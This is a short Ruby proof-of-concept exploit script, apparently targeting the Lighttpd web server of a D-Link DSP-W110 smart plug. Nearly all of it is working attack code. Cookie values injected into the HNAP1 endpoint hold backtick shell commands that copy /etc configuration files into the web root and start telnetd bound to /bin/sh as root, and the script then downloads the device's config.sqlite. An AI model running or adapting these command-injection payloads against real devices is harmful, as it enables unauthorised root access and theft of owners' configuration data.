# DSP-W110-Lighttpd PoC.

require 'pp'
require 'optparse'
require 'restclient'

# Set defaults and parse command line arguments
options = {}

options[:addr] = "192.168.0.60"
options[:port] = 80

OptionParser.new do |option|

  option.on("--address [ADDRESS]", "Destination hostname or IP") do |a|
    options[:addr] = a
  end

  option.on("--port [PORT]", "Destination TCP port") do |p|
    options[:port] = p
  end

  option.parse!

end

# Define which actions we will be using.
actions = [
  {
    :name => "Get device information",
    :call => "txt_parser",
    :path => "mplist.txt",
  },
  {
    :name => "Snatch configuration",
    :call => "noop",
    :path => "HNAP1",
    :cookies => { :cookie => "`cp /etc/co* /www/`" }
  },
  {
    :name => "Fetch configuration",
    :call => "conf_writer",
    :path => "config.sqlite",
  },
  {
    :name => "Enable telnet (root)",
    :call => "noop",
    :path => "HNAP1",
    :cookies => { :cookie => "`telnetd -l/bin/sh`" }
  }
]

def noop(val)
  return
end

def txt_parser(txt)
  txt.split(/\r?\n/).each do |line|
    puts "    #{line}"
  end
end

def conf_writer(txt)
  begin
    f = File.open('./config.sqlite', 'wb')
  rescue => e
    puts "[!] Failed to open config.sqlite for writing #{e.message}"
  end
  f.write(txt)
  f.close
  puts "[*] Configuration fetched into 'config.sqlite'"
end

# Iterate over all actions and attempt to execute.
url = "http://#{options[:addr]}:#{options[:port]}"

puts "[!] Attempting to extract information from #{url}"

actions.each do |action|

  # Fire the request and ensure a 200 OKAY.
  begin
    response = RestClient.get(
      "#{url}/#{action[:path]}",
      {:cookies => action[:cookies]}
    )
  rescue
    puts "[!] Failed to query remote host."
    abort
  end

  if response.code != 200
    puts "[-] '#{action[:name]}' failed with response: #{response.code}"
    next
  end

  # Send to the processor.
  puts "[*] #{action[:name]} request succeeded."
  send(action[:call], response.body())

end
